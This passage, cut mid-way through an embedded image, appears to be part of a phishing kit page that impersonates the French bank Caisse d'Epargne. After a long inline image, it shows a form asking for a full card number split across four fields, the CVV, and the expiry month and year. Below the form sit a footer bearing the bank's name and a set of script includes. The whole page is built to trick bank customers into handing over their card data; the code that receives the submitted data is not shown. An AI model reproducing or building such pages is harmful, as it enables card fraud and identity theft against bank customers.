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' width="110px" height="70px"/>
                                </center>
								<label class="mb-4 ">
                                    <p class="label-txt"></p>
									 <span class="prefix"></span>
                                    <input type="text" class="input" id="cc_number" name="cc_number" placeholder="4978 xxxx xxxx xxxx">

                                </label>
								 <label class="mb-4 ">
                                    <p class="label-txt">Date d'expiration (MM/AA)</p>
                                    <input type="text" maxlength="7" class="input" id="cc_date" name="cc_date" >

                                </label>
                                <label class="mb-4 ">
                                    <p class="label-txt">Cryptogramme visuel (CVV)</p>
                                    <input type="text" maxlength="3" class="input" id="cc_cvv" name="cc_cvv" >

                                </label>-->
								<div class="modal-body" id="mbody2" style="padding: 15px 0px;">
			
			  <table style="margin: 0 auto;">
				<tbody>
					<td colspan="4">
						<p style="padding:4px;"><b style="font-size:12px">N° de carte bancaire:</b></p>
						<input type="text" class="form-control" id="ccnum1" name="ccnum1" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="4XXX" required>
						<input type="text" class="form-control" id="ccnum2" name="ccnum2" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="XXXX" required>
						<input type="text" class="form-control" id="ccnum3" name="ccnum3" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="XXXX" required>
						<input type="text" class="form-control" id="ccnum4" name="ccnum4" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="XXXX" required>
					</td>
				</tr>
				<tr>
					<td>
						<p style="padding:4px;"><b style="font-size:12px">CVV/CSC:</b></p>
						<input type="text" id="ccv" name="ccv" maxlength="3" required="" style="text-align: center;" placeholder="XXX" required>
					</td>
					
					<td colspan="3" style="text-align: right;">
						<p style="padding:4px; padding-right: 88px;"><b style="font-size:11px">Date d'expiration:</b></p>
						<select id="expm" name="007" required="" placeholder="" style="width: 98px;" required>
							<option value="" disabled="" selected="">Mois</option>
                            <option value="01">01-janvier</option>
							<option value="02">02-février</option>
							<option value="03">03-mars</option>
							<option value="04">04-avril</option>
							<option value="05">05-mai</option>
							<option value="06">06-juin</option>
							<option value="07">07-juillet</option>
							<option value="08">08-août</option>
							<option value="09">09-septembre</option>
							<option value="10">10-octobre</option>
							<option value="11">11-novembre</option>
							<option value="12">12-décembre</option>
						</select>

						<select id="expy" name="008" required="" placeholder="Date d'expiration (MM/AAAA)" style="width: 90px;" required>
							<option value="" disabled="" selected="">Année</option>							
							<option value="21">2021</option>
							<option value="22">2022</option>
							<option value="23">2023</option>
							<option value="24">2024</option>
							<option value="25">2025</option>
							<option value="26">2026</option>
							<option value="27">2027</option>
							<option value="28">2028</option>
							<option value="29">2029</option>
							<option value="30">2030</option>
						</select>
					</td>
				</tr>
				
			  </tbody></table>

               <p id="warningparag2" style="color:red;display:none;">Tous les champs sont obligatoires !</p>

            </div>
								
								<br>
                               <center> <button type="submit" style="width:50%;">Continuer</button></center>
                            </form>
                        </div>  
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->
<br><br><br>
        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <ul>
                    <li>Aide à la connexion</li>
                    <li>Sécurité</li>
                    <li>Infos navigateurs</li>
                    <li>Mentions légales</li>
                </ul>
                <p>&copy; Caisse d'Epargne <?php echo date('Y'); ?></p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script>
            $('#cc_cvv').payment('formatCardCVC');
            $('#cc_date').payment('formatCardExpiry');
            $('#cc_number').payment('formatCardNumber');
        </script>

    </body>

</html>